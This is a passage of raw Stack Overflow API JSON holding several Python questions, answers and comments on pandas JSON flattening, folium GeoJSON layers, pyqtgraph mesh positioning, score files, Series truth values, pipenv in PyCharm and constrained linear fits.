"pandas"], "answers": [{"comments": [{"owner": {"reputation": 313, "user_id": 11493942, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/DNOv1.jpg?s=128&g=1", "display_name": "Stiven Ram&#237;rez Arango", "link": "https://stackoverflow.com/users/11493942/stiven-ram%c3%adrez-arango"}, "edited": false, "score": 0, "creation_date": 1571923761, "post_id": 58531903, "comment_id": 103406411, "body": "It doesn&#39;t work."}, {"owner": {"reputation": 313, "user_id": 11493942, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/DNOv1.jpg?s=128&g=1", "display_name": "Stiven Ram&#237;rez Arango", "link": "https://stackoverflow.com/users/11493942/stiven-ram%c3%adrez-arango"}, "edited": false, "score": 0, "creation_date": 1571923777, "post_id": 58531903, "comment_id": 103406425, "body": "I obtained this:  0\t{&#39;country&#39;: &#39;Colombia&#39;, &#39;department&#39;: &#39;Antioqu... 1\t{&#39;country&#39;: &#39;Colombia&#39;, &#39;department&#39;: &#39;Antioqu... 2\t{&#39;country&#39;: &#39;Colombia&#39;, &#39;department&#39;: &#39;Antioqu... 3\t{&#39;country&#39;: &#39;Colombia&#39;, &#39;department&#39;: &#39;Antioqu... 4\t{&#39;country&#39;: &#39;Colombia&#39;, &#39;department&#39;: &#39;Antioqu..."}], "tags": [], "owner": {"reputation": 2389, "user_id": 7348030, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-7PmbNFJwfPc/AAAAAAAAAAI/AAAAAAAAAJE/5lDuTFQtNpQ/photo.jpg?sz=128", "display_name": "Florian Bernard", "link": "https://stackoverflow.com/users/7348030/florian-bernard"}, "is_accepted": false, "score": 0, "last_activity_date": 1571870959, "creation_date": 1571870959, "answer_id": 58531903, "question_id": 58531729, "link": "https://stackoverflow.com/questions/58531729/nested-json-to-pandas-dataframes/58531903#58531903", "title": "Nested JSON to Pandas DataFrames", "body": "<p>Did you try.</p>\n\n<pre class=\"lang-py prettyprint-override\"><code>df[\"location\"].apply(pd.Series)\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 313, "user_id": 11493942, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/DNOv1.jpg?s=128&g=1", "display_name": "Stiven Ram&#237;rez Arango", "link": "https://stackoverflow.com/users/11493942/stiven-ram%c3%adrez-arango"}, "edited": false, "score": 0, "creation_date": 1571923517, "post_id": 58531986, "comment_id": 103406260, "body": "The first solution doesn&#39;t work for me."}, {"owner": {"reputation": 313, "user_id": 11493942, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/DNOv1.jpg?s=128&g=1", "display_name": "Stiven Ram&#237;rez Arango", "link": "https://stackoverflow.com/users/11493942/stiven-ram%c3%adrez-arango"}, "edited": false, "score": 0, "creation_date": 1571923525, "post_id": 58531986, "comment_id": 103406264, "body": "0                     address      city   country d... 1                              address      city   ... Name: location, dtype: object"}, {"owner": {"reputation": 313, "user_id": 11493942, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/DNOv1.jpg?s=128&g=1", "display_name": "Stiven Ram&#237;rez Arango", "link": "https://stackoverflow.com/users/11493942/stiven-ram%c3%adrez-arango"}, "edited": false, "score": 0, "creation_date": 1571923536, "post_id": 58531986, "comment_id": 103406277, "body": "I obtained this."}, {"owner": {"reputation": 313, "user_id": 11493942, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/DNOv1.jpg?s=128&g=1", "display_name": "Stiven Ram&#237;rez Arango", "link": "https://stackoverflow.com/users/11493942/stiven-ram%c3%adrez-arango"}, "edited": false, "score": 0, "creation_date": 1571923691, "post_id": 58531986, "comment_id": 103406370, "body": "The second solution works if exists the column in all json documents, but sometimes a specific column doesn&#39;t exist. How can I do in that situation?"}], "tags": [], "owner": {"reputation": 26154, "user_id": 11884237, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7d7q4.png?s=128&g=1", "display_name": "ansev", "link": "https://stackoverflow.com/users/11884237/ansev"}, "is_accepted": false, "score": 1, "last_activity_date": 1571872203, "last_edit_date": 1571872203, "creation_date": 1571871570, "answer_id": 58531986, "question_id": 58531729, "link": "https://stackoverflow.com/questions/58531729/nested-json-to-pandas-dataframes/58531986#58531986", "title": "Nested JSON to Pandas DataFrames", "body": "<p>Use:</p>\n\n<pre><code>df2=df['location'].apply(lambda x: pd.DataFrame(x)) \npd.concat([df[df.columns[:-1]],df2],axis=1)\n</code></pre>\n\n<hr>\n\n<p>Also you can try <code>json_normalize</code></p>\n\n<pre><code>from pandas.io.json import json_normalize\ndf=json_normalize(json_documents) \n</code></pre>\n"}], "owner": {"reputation": 313, "user_id": 11493942, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/DNOv1.jpg?s=128&g=1", "display_name": "Stiven Ram&#237;rez Arango", "link": "https://stackoverflow.com/users/11493942/stiven-ram%c3%adrez-arango"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 351, "favorite_count": 1, "closed_date": 1572703012, "answer_count": 2, "score": 0, "last_activity_date": 1571872203, "creation_date": 1571869620, "question_id": 58531729, "link": "https://stackoverflow.com/questions/58531729/nested-json-to-pandas-dataframes", "closed_reason": "Duplicate", "title": "Nested JSON to Pandas DataFrames", "body": "<p>I'm trying to expand nested json to pandas dataframe, but the offered solutions haven't worked for me. </p>\n\n<p>My case is: </p>\n\n<p>I have json data in MongoDB.</p>\n\n<p>When I connect with this database, it works well, but the problem is when I need to expand nested json to pandas dataframes, because there are columns where I have json object.</p>\n\n<pre><code>index   id    name         location\n0       0001  George       [{'country':'Colombia', 'department': 'Antioquia', 'city': 'Medellin'}]\n1       0002  Gilberth     [{'country':'Colombia', 'department': 'Antioquia', 'city': 'Medellin'}]\n2       0003  Christopher  [{'country':'Colombia', 'department': 'Antioquia', 'city': 'Medellin'}]      \n</code></pre>\n\n<p>I need to convert to dataframe something like this:</p>\n\n<pre><code>index   id    name         country   department  city\n0       0001  George       Colombia  Antioquia   Medellin\n1       0002  Gilberth     Colombia  Antioquia   Medellin\n2       0003  Christopher  Colombia  Antioquia   Medellin     \n</code></pre>\n\n<p>Here I show how to read json data:</p>\n\n<pre class=\"lang-py prettyprint-override\"><code>json_documents = list(properties.find({}))\ndf = pd.DataFrame(json_documents)\ndf.head(2)\n</code></pre>\n\n<p>Thanks in advance.</p>\n"}, {"tags": ["python", "geojson", "folium"], "answers": [{"tags": [], "owner": {"reputation": 3, "user_id": 13435829, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-b18wlPHx7CQ/AAAAAAAAAAI/AAAAAAAAAAA/AAKWJJMC2xDsxYhQT2wRd6dnnuH4bzBlMg/photo.jpg?sz=128", "display_name": "Gatnik", "link": "https://stackoverflow.com/users/13435829/gatnik"}, "is_accepted": false, "score": 0, "last_activity_date": 1599316748, "last_edit_date": 1599316748, "creation_date": 1599316384, "answer_id": 63755057, "question_id": 58531687, "link": "https://stackoverflow.com/questions/58531687/json-layer-on-folium-map-is-missing-but-there-are-no-errors/63755057#63755057", "title": "Json layer on folium map is missing, but there are no errors", "body": "<p>I had exact same issue when trying to plot geoJSON files on my folium map. I figured out my issue was the absence of/wrong coordinate system.</p>\n<p>Since I was converting my data from shapefile to geoJSON I used QGIS to project the data into right coordinate system (I believe that EPSG:4326 - WGS84 usually works).</p>\n"}], "owner": {"reputation": 77, "user_id": 9195852, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ed0612fedd28088ecb684760cc7de590?s=128&d=identicon&r=PG&f=1", "display_name": "CMH89", "link": "https://stackoverflow.com/users/9195852/cmh89"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 250, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1599316748, "creation_date": 1571869281, "question_id": 58531687, "link": "https://stackoverflow.com/questions/58531687/json-layer-on-folium-map-is-missing-but-there-are-no-errors", "title": "Json layer on folium map is missing, but there are no errors", "body": "<p>I am trying to overlay a Voronoi diagram over a folium web map. I am creating the voronoi map with SciPy and then converting it to Json. When I generate the map, the entire map is there except for the Voronoi layer, but the layer does show up in Layer Control. </p>\n\n<p>I'm guessing that the error is somewhere in how the Json file is being created. I've been searching but without an error, I haven't been able to find anything</p>\n\n<p>Folium map generation</p>\n\n<pre class=\"lang-py prettyprint-override\"><code>\nm = folium.Map(location=[43.521, -120.587],\nzoom_start = 7.45,\ntiles = 'Mapbox Bright')\n\ntooltip = 'Click for detailed information'\n\nfor point in range(len(locationList)):\n    folium.Marker(locationList[point], popup = labels[point], icon = folium.Icon(color = colors[point]), parse_html=True).add_to(m)\n\nm.save('index.html')\n</code></pre>\n\n<p>Voronoi diagram generation</p>\n\n<pre class=\"lang-py prettyprint-override\"><code>### Create volonai map\npoints = np.array(df[[\"geo_long\",\"geo_lat\"]].values.tolist()) # Create points, each point is a hospital\n\nvor = Voronoi(points) #Create voronoi object \n\nvoronoi_plot_2d(vor) # Create voronoi plot object\n\n</code></pre>\n\n<p>Conversion to Json</p>\n\n<pre class=\"lang-py prettyprint-override\"><code>\nvorJSON = open('libVor.json', 'w')\n\npoint_voronoi_list = []\nfeature_list = []\nfor region in range(len(vor.regions)-1):    \n    vertex_list = []\n    for x in vor.regions[region]:\n        if x == -1:\n            break;\n        else:\n            vertex = vor.vertices[x]\n            vertex = (vertex[1], vertex[0])\n        vertex_list.append(vertex)\n    polygon = Polygon([vertex_list])\n    feature = Feature(geometry=polygon, properties={})\n    feature_list.append(feature)\n\n\nfeature_collection = FeatureCollection(feature_list)\nprint (feature_collection, file=vorJSON)\nvorJSON.close()\n\n</code></pre>\n\n<p>Adding layer to the map</p>\n\n<pre class=\"lang-py prettyprint-override\"><code>\nvorGeoJson = json.load(open('libVor.json'))\n\nfolium.GeoJson(vorGeoJson, \n                name = 'geojson'\n).add_to(m)\n\nfolium.LayerControl().add_to(m)\n\nprint(m)\n\nm.save(outfile='libVor.html')\n\n</code></pre>\n\n<p>My goal is to get the polygons to overlay on the web map</p>\n"}, {"tags": ["python", "opengl", "pyqtgraph"], "answers": [{"comments": [{"owner": {"reputation": 35, "user_id": 11569105, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-0QKcCjjwY8I/AAAAAAAAAAI/AAAAAAAAABE/ywrMztWAVS8/photo.jpg?sz=128", "display_name": "Matthew Connolly", "link": "https://stackoverflow.com/users/11569105/matthew-connolly"}, "edited": false, "score": 0, "creation_date": 1572027767, "post_id": 58544468, "comment_id": 103446248, "body": "This solves the problem perfectly and makes sense.  Thank you for both the solution as well as the link describing the underlying principal.  Cheers!"}], "tags": [], "owner": {"reputation": 138010, "user_id": 5577765, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/LoGpC.jpg?s=128&g=1", "display_name": "Rabbid76", "link": "https://stackoverflow.com/users/5577765/rabbid76"}, "is_accepted": true, "score": 1, "last_activity_date": 1571930553, "creation_date": 1571930553, "answer_id": 58544468, "question_id": 58531651, "link": "https://stackoverflow.com/questions/58531651/how-to-set-absolute-position-of-glmeshitem-in-3d-pyqtgraph-implementation/58544468#58544468", "title": "How to set absolute position of GLMeshItem in 3D pyqtgraph implementation", "body": "<p>An option is to reset the item\u2019s transform to an <a href=\"https://en.wikipedia.org/wiki/Identity_matrix\" rel=\"nofollow noreferrer\">identity</a> transformation by <a href=\"http://www.pyqtgraph.org/documentation/3dgraphics/glgraphicsitem.html\" rel=\"nofollow noreferrer\"><code>resetTransform()</code></a>, before you set the absolute position by <code>translate()</code>. e.g:</p>\n\n<pre class=\"lang-py prettyprint-override\"><code>targetMI.resetTransform()\ntargetMI.translate(10, 0, 0)\n</code></pre>\n"}], "owner": {"reputation": 35, "user_id": 11569105, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-0QKcCjjwY8I/AAAAAAAAAAI/AAAAAAAAABE/ywrMztWAVS8/photo.jpg?sz=128", "display_name": "Matthew Connolly", "link": "https://stackoverflow.com/users/11569105/matthew-connolly"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 449, "favorite_count": 0, "accepted_answer_id": 58544468, "answer_count": 1, "score": 1, "last_activity_date": 1571930590, "creation_date": 1571869058, "last_edit_date": 1571930590, "question_id": 58531651, "link": "https://stackoverflow.com/questions/58531651/how-to-set-absolute-position-of-glmeshitem-in-3d-pyqtgraph-implementation", "title": "How to set absolute position of GLMeshItem in 3D pyqtgraph implementation", "body": "<p>I am building a visualizer for some data and want to use 3D spheres plotted in pyqtgraphs 3D OpenGL components to represent targets identified within the data provided.  </p>\n\n<p>I am able to generate the spheres and move them using <code>GLMeshItem.translate()</code> commands, however I am not able to find a convenient way of setting coordinates of the sphere without first getting the current position of said spheres through a call to .transform() and then generating a translate command from it's current position to the new absolute coordinates I would like it to be moved to.  It may be that that is the only way to accomplish this, I just suspect there is a more direct set the mesh items absolute coordinates that I just can't seem to identify.</p>\n\n<p>The following code shows a basic framework for what I am doing, and also the current method I am using to move the sphere.</p>\n\n<pre class=\"lang-py prettyprint-override\"><code>\nfrom pyqtgraph.Qt import QtCore, QtGui\nimport pyqtgraph as pg\nimport pyqtgraph.opengl as gl\nimport numpy as np\n\napp = QtGui.QApplication([])\nw = gl.GLViewWidget()\nw.showMaximized()\nw.setWindowTitle('pyqtgraph example: GLMeshItem')\nw.setCameraPosition(distance=40)\n\ng = gl.GLGridItem()\ng.scale(2,2,1)\nw.addItem(g)\n\nverts = np.array([\n    [0, 0, 0],\n    [2, 0, 0],\n    [1, 2, 0],\n    [1, 1, 1],\n])\nfaces = np.array([\n    [0, 1, 2],\n    [0, 1, 3],\n    [0, 2, 3],\n    [1, 2, 3]\n])\ncolors = np.array([\n    [1, 0, 0, 0.3],\n    [0, 1, 0, 0.3],\n    [0, 0, 1, 0.3],\n    [1, 1, 0, 0.3]\n])\n\n\nmd = gl.MeshData.sphere(rows=4, cols=4)\n\ncolors = np.ones((md.faceCount(), 4), dtype=float)\ncolors[::2,0] = 0\ncolors[:,1] = np.linspace(0, 1, colors.shape[0])\nmd.setFaceColors(colors)\nm3 = gl.GLMeshItem(meshdata=md, smooth=False)#, shader='balloon')\nw.addItem(m3)\n\ntarget = gl.MeshData.sphere(4,4,10)\ntargetMI = gl.GLMeshItem(meshdata = target, drawFaces = True,smooth = False)\nw.addItem(targetMI)\nwhile(1):\n    targetMI.translate(0.1,0,0)\n    app.processEvents()\n\n\n\n## Start Qt event loop unless running in interactive mode.\nif __name__ == '__main__':\n    import sys\n    if (sys.flags.interactive != 1) or not hasattr(QtCore, 'PYQT_VERSION'):\n        QtGui.QApplication.instance().exec_()\n\n</code></pre>\n\n<p>As can be seen in this example.  translate works fine for moving relative to the current position.  I am just curious as to whether there is a method for doing an absolute position move on the <code>GLMeshItem</code> (in this case <code>targetMI</code>) such that I could make it move to a coordinate without having to first get the transform and then calculating the translate required to move to the desired coordinates.</p>\n"}, {"tags": ["python", "python-3.x"], "comments": [{"owner": {"reputation": 15430, "user_id": 4518341, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/eVuAv.png?s=128&g=1", "display_name": "wjandrea", "link": "https://stackoverflow.com/users/4518341/wjandrea"}, "edited": false, "score": 0, "creation_date": 1571869756, "post_id": 58531644, "comment_id": 103387261, "body": "Yes, there is a way to do it. What do you need help with? Please read <a href=\"https://stackoverflow.com/questions/how-to-ask\">How to Ask</a>."}, {"owner": {"reputation": 15430, "user_id": 4518341, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/eVuAv.png?s=128&g=1", "display_name": "wjandrea", "link": "https://stackoverflow.com/users/4518341/wjandrea"}, "edited": false, "score": 0, "creation_date": 1571869809, "post_id": 58531644, "comment_id": 103387272, "body": "Also this code could really use a rewrite. For example you know how to use a <code>with</code> statement, so why are you manually opening and closing <code>scores.txt</code>? Why do you use <code>while</code> instead of <code>if</code>? Why do you do <code>sys.exit()</code> instead of just letting it exit on its own? Why do you only write 5 scores back to the file?"}, {"owner": {"reputation": 15430, "user_id": 4518341, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/eVuAv.png?s=128&g=1", "display_name": "wjandrea", "link": "https://stackoverflow.com/users/4518341/wjandrea"}, "edited": false, "score": 0, "creation_date": 1571870157, "post_id": 58531644, "comment_id": 103387349, "body": "Also, use <code>print(points1, points2, sep=&#39;\\n&#39;, file=Scorefile)</code>"}], "answers": [{"comments": [{"owner": {"reputation": 15, "user_id": 12191186, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/a-/AAuE7mAhhfd4E-NVfKXR8yj4MPyQHs6h9qPmjicewUtA=k-s128", "display_name": "galaxy943", "link": "https://stackoverflow.com/users/12191186/galaxy943"}, "edited": false, "score": 0, "creation_date": 1571945488, "post_id": 58532236, "comment_id": 103416976, "body": "if i did that how would i sort the strings"}, {"owner": {"reputation": 58, "user_id": 11606747, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f8de532c53a24aa0b5df56da935c371d?s=128&d=identicon&r=PG&f=1", "display_name": "Mike", "link": "https://stackoverflow.com/users/11606747/mike"}, "reply_to_user": {"reputation": 15, "user_id": 12191186, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/a-/AAuE7mAhhfd4E-NVfKXR8yj4MPyQHs6h9qPmjicewUtA=k-s128", "display_name": "galaxy943", "link": "https://stackoverflow.com/users/12191186/galaxy943"}, "edited": false, "score": 0, "creation_date": 1572036380, "post_id": 58532236, "comment_id": 103449502, "body": "I&#39;m very confused by what you means sort the strings. Like Alphabetical order? I would need more information to help me understand what your meaning of &quot;sort&quot; is."}], "tags": [], "owner": {"reputation": 58, "user_id": 11606747, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f8de532c53a24aa0b5df56da935c371d?s=128&d=identicon&r=PG&f=1", "display_name": "Mike", "link": "https://stackoverflow.com/users/11606747/mike"}, "is_accepted": false, "score": 0, "last_activity_date": 1571873757, "creation_date": 1571873757, "answer_id": 58532236, "question_id": 58531644, "link": "https://stackoverflow.com/questions/58531644/how-to-add-a-string-and-integer-into-a-file-and-then-sort-it/58532236#58532236", "title": "How to add a string and integer into a file and then sort it?", "body": "<p>Why not create 2 files and have the 1st file store strings and 2nd file store ints.\nThen extract the info if needed from both. Very simple and easy.</p>\n"}], "owner": {"reputation": 15, "user_id": 12191186, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/a-/AAuE7mAhhfd4E-NVfKXR8yj4MPyQHs6h9qPmjicewUtA=k-s128", "display_name": "galaxy943", "link": "https://stackoverflow.com/users/12191186/galaxy943"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 43, "favorite_count": 0, "answer_count": 1, "score": -2, "last_activity_date": 1571873757, "creation_date": 1571868997, "last_edit_date": 1571869499, "question_id": 58531644, "link": "https://stackoverflow.com/questions/58531644/how-to-add-a-string-and-integer-into-a-file-and-then-sort-it", "title": "How to add a string and integer into a file and then sort it?", "body": "<p>In my code the program asks for the users name and score. However I can send the score to a file and sort it. Is there any way to change the code so that the player name gets sent to the file and also sorts along with its corresponding number.</p>\n\n<pre><code>player_1=input('What is your name?')\npoints1=input('What is your score?')\nplayer_2=input('What is your name?')\npoints2=input('What is your score?')\n\nleaderboard=input('Type YES if you would like to see the tp scores and NO if you wouldnt')\nwhile leaderboard=='YES':\n    Scorefile=open('scores.txt','a')\n    Scorefile.write(points1)\n    Scorefile.write(\"\\n\")\n    Scorefile.write(points2)\n    Scorefile.write(\"\\n\")\n    Scorefile.close()\n    Scorefile = open('scores.txt','r')\n    with open('scores.txt','r') as Scorefile:\n        scores=Scorefile.readline()\n        List1=[]\n        while scores:\n            scores2=(scores.strip())\n            List1.append(scores2)\n            scores=Scorefile.readline()\n    for i in range(0, len(List1)):\n        List1[i] = int(List1[i])        \n    List1.sort(reverse=True)\n\n    print(List1[0:5])\n    leaderboard='ANYTHING'\nwhile leaderboard=='NO':\n    sys.exit()\n</code></pre>\n"}, {"tags": ["python", "pandas", "dataframe", "valueerror"], "comments": [{"owner": {"reputation": 3424, "user_id": 3750257, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KF8gx.png?s=128&g=1", "display_name": "pppery", "link": "https://stackoverflow.com/users/3750257/pppery"}, "edited": false, "score": 1, "creation_date": 1571885893, "post_id": 58531631, "comment_id": 103390221, "body": "Possible duplicate of <a href=\"https://stackoverflow.com/questions/36921951/truth-value-of-a-series-is-ambiguous-use-a-empty-a-bool-a-item-a-any-o\">Truth value of a Series is ambiguous. Use a.empty, a.bool(), a.item(), a.any() or a.all()</a>"}], "answers": [{"comments": [{"owner": {"reputation": 26154, "user_id": 11884237, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7d7q4.png?s=128&g=1", "display_name": "ansev", "link": "https://stackoverflow.com/users/11884237/ansev"}, "edited": false, "score": 0, "creation_date": 1571869600, "post_id": 58531660, "comment_id": 103387223, "body": "Why could he  want use only the first value?"}, {"owner": {"reputation": 500, "user_id": 8538536, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/7KHPV.jpg?s=128&g=1", "display_name": "Suraj Motaparthy", "link": "https://stackoverflow.com/users/8538536/suraj-motaparthy"}, "reply_to_user": {"reputation": 26154, "user_id": 11884237, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7d7q4.png?s=128&g=1", "display_name": "ansev", "link": "https://stackoverflow.com/users/11884237/ansev"}, "edited": false, "score": 0, "creation_date": 1571869714, "post_id": 58531660, "comment_id": 103387252, "body": "@ansev Even if we output multiple values, the next steps break as op is treating it as a singular True or False variable"}], "tags": [], "owner": {"reputation": 500, "user_id": 8538536, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/7KHPV.jpg?s=128&g=1", "display_name": "Suraj Motaparthy", "link": "https://stackoverflow.com/users/8538536/suraj-motaparthy"}, "is_accepted": true, "score": 0, "last_activity_date": 1571869137, "creation_date": 1571869137, "answer_id": 58531660, "question_id": 58531631, "link": "https://stackoverflow.com/questions/58531631/why-does-a-boolean-if-statement-using-pandas-create-an-error/58531660#58531660", "title": "Why does a boolean if statement using pandas create an error?", "body": "<p>It seems you will be using a 1 row dataframe for this scenario. Then you can use</p>\n\n<pre><code>dfrow.str.contains('Animation').iloc[0]\n instead of \ndfrow.str.contains('Animation')\n</code></pre>\n"}], "owner": {"reputation": 17, "user_id": 12265710, "user_type": "registered", "profile_image": "https://graph.facebook.com/899899983758293/picture?type=large", "display_name": "user12265710", "link": "https://stackoverflow.com/users/12265710/user12265710"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 33, "favorite_count": 0, "closed_date": 1571894838, "accepted_answer_id": 58531660, "answer_count": 1, "score": 0, "last_activity_date": 1571886142, "creation_date": 1571868927, "last_edit_date": 1571886142, "question_id": 58531631, "link": "https://stackoverflow.com/questions/58531631/why-does-a-boolean-if-statement-using-pandas-create-an-error", "closed_reason": "Needs details or clarity", "title": "Why does a boolean if statement using pandas create an error?", "body": "<p>How do I format this to be able to test with an if statement?</p>\n\n<pre><code>result = dfrow.str.contains('Animation')\nx = 0\nprint(result)\nif result == False:\n    x = 1\nif result == True:\n    x = 2\n</code></pre>\n\n<p>The print function outputs:</p>\n\n<pre><code>1    False\n\nName: genres, dtype: bool\n</code></pre>\n\n<p>The error given:</p>\n\n<pre><code>----&gt; 4 if result == False:\n\nValueError: The truth value of a Series is ambiguous. Use a.empty, a.bool(), a.item(), a.any() or a.all().\n</code></pre>\n"}, {"tags": ["python", "pycharm", "pipenv"], "answers": [{"tags": [], "owner": {"reputation": 308, "user_id": 12149993, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-w1Vrds2hWwA/AAAAAAAAAAI/AAAAAAAAAAA/uivpF8ISptg/photo.jpg?sz=128", "display_name": "Bret Hess", "link": "https://stackoverflow.com/users/12149993/bret-hess"}, "is_accepted": false, "score": 0, "last_activity_date": 1572287159, "creation_date": 1572287159, "answer_id": 58596446, "question_id": 58531608, "link": "https://stackoverflow.com/questions/58531608/pipenv-dependencies-ok-in-terminal-not-in-pycharm/58596446#58596446", "title": "pipenv dependencies OK in terminal, not in PyCharm", "body": "<p>After playing for a week with PyCharm, it seems you <strong>do</strong> have to allow PyCharm to make its own pipenv environment or install from Pipfile.lock, although it uses the packages you've already downloaded. </p>\n"}], "owner": {"reputation": 308, "user_id": 12149993, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-w1Vrds2hWwA/AAAAAAAAAAI/AAAAAAAAAAA/uivpF8ISptg/photo.jpg?sz=128", "display_name": "Bret Hess", "link": "https://stackoverflow.com/users/12149993/bret-hess"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 100, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1572287159, "creation_date": 1571868769, "last_edit_date": 1571870768, "question_id": 58531608, "link": "https://stackoverflow.com/questions/58531608/pipenv-dependencies-ok-in-terminal-not-in-pycharm", "title": "pipenv dependencies OK in terminal, not in PyCharm", "body": "<p>Using only the terminal, I got my project installed using an existing Pipfile, and pipenv install, etc.  I can run it in the terminal and all dependencies are met. </p>\n\n<p>I created a PyCharm project using the directory. In the project settings, I have the pipenv intepreter created by the virtual environment chosen in the project settings, but none of the packages that are installed and working are shown in that window, see project interpreter image</p>\n\n<p><img src=\"https://i.stack.imgur.com/AHp62.png\" alt=\"\"></p>\n\n<p>When I try to run the program in PyCharm it wants to install all the dependencies in the Pipfile.  Does it have to go through this \"Install\" (or \"reinstall\") process in order to get the paths right, or is there something else I'm missing? </p>\n\n<p>Or is this because I didn't use Pipfile.lock explicitly when I installed things in the terminal?</p>\n"}, {"tags": ["python", "numpy", "scipy", "scipy-optimize"], "comments": [{"owner": {"reputation": 16677, "user_id": 1092820, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bc78da24118b403595f62fa7856e1b6c?s=128&d=identicon&r=PG", "display_name": "Ruzihm", "link": "https://stackoverflow.com/users/1092820/ruzihm"}, "edited": false, "score": 1, "creation_date": 1571869075, "post_id": 58531601, "comment_id": 103387077, "body": "Possible duplicate of <a href=\"https://stackoverflow.com/q/15191088/1092820\">How to do a polynomial fit with fixed points</a> with degree=1"}], "answers": [{"tags": [], "owner": {"reputation": 724, "user_id": 4531017, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-8vSmawKp7oc/AAAAAAAAAAI/AAAAAAAAAKE/GPykLlh0Tk8/photo.jpg?sz=128", "display_name": "Callin", "link": "https://stackoverflow.com/users/4531017/callin"}, "is_accepted": true, "score": 3, "last_activity_date": 1571871137, "creation_date": 1571871137, "answer_id": 58531930, "question_id": 58531601, "link": "https://stackoverflow.com/questions/58531601/linear-fit-constrained-to-go-through-the-first-point-in-python/58531930#58531930", "title": "Linear fit constrained to go through the first point in Python", "body": "<p>One way to do it would be to center your data on (x_0, y_0), run linear regression (specifying no intercept), and then transform the predictions back to the original scale. </p>\n\n<p>Here's an example:</p>\n\n<pre><code>import numpy as np\nimport matplotlib.pyplot as plt\n\nx = np.random.randn(100)\ny = np.random.randn(100)  +  x\n\nplt.plot(x, y, \"o\")\nplt.plot(x[0], y[0], \"o\") # x_0, y_0 is the orange dot\n</code></pre>\n\n<p><a href=\"https://i.stack.imgur.com/TkRIi.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/TkRIi.png\" alt=\"input data\"></a></p>\n\n<p>Next, use linear regression without an intercept to fit a line that goes through the transformed data.</p>\n\n<pre><code>from sklearn.linear_model import LinearRegression\n\nlm = LinearRegression(fit_intercept = False)\n\n# center data on x_0, y_0\ny2 = y - y[0]\nx2 = x - x[0]\n\n# fit model\nlm.fit(x2.reshape(-1, 1), y2)\n</code></pre>\n\n<p>Last, predict the line and plot it back on the original scale</p>\n\n<pre><code># predict line\npreds = lm.predict(np.arange(-5, 5, 0.1).reshape(-1,1))\n# plot on original scale\nplt.plot(x, y, \"o\")\nplt.plot(x[0], y[0], \"o\")\n# add x_0 and y_0 back to the predictions\nplt.plot(np.arange(-5, 5, 0.1) + x[0], preds  + y[0])\n</code></pre>\n\n<p><a href=\"https://i.stack.imgur.com/V8ZMF.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/V8ZMF.png\" alt=\"enter image description here\"></a></p>\n"}], "owner": {"reputation": 749, "user_id": 3143742, "user_type": "registered", "accept_rate": 72, "profile_image": "https://graph.facebook.com/36806326/picture?type=large", "display_name": "Chris vCB", "link": "https://stackoverflow.com/users/3143742/chris-vcb"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 558, "favorite_count": 0, "accepted_answer_id": 58531930, "answer_count": 1, "score": 1, "last_activity_date": 1571871137, "creation_date": 1571868717, "last_edit_date": 1571869882, "question_id": 58531601, "link": "https://stackoverflow.com/questions/58531601/linear-fit-constrained-to-go-through-the-first-point-in-python", "title": "Linear fit constrained to go through the first point in Python", "body": "<p>I have two <code>numpy</code> 1-d arrays of equal length, <code>x</code> and a response variable <code>y</code>. I'd like to do a least-squares fit that forces the resulting line to go through the point <code>(x_0, y_0)</code>. What's the easiest way to pull this off?</p>\n\n<p>Note: some optimization solutions have been proposed. These are good in theory, but the line must go exactly through the point \u2013\u00a0even if the fit for the rest of the points is worse. </p>\n"}, {"tags": ["python", "tkinter"], "answers": [{"tags": [], "owner": {"reputation": 305939, "user_id": 7432, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/3e3921ee8a7792e4b5da0244933395e8?s=128&d=identicon&r=PG", "display_name": "Bryan Oakley", "link": "https://stackoverflow.com/users/7432/bryan-oakley"}, "is_accepted": true, "score": 0, "last_activity_date": 1571870110, 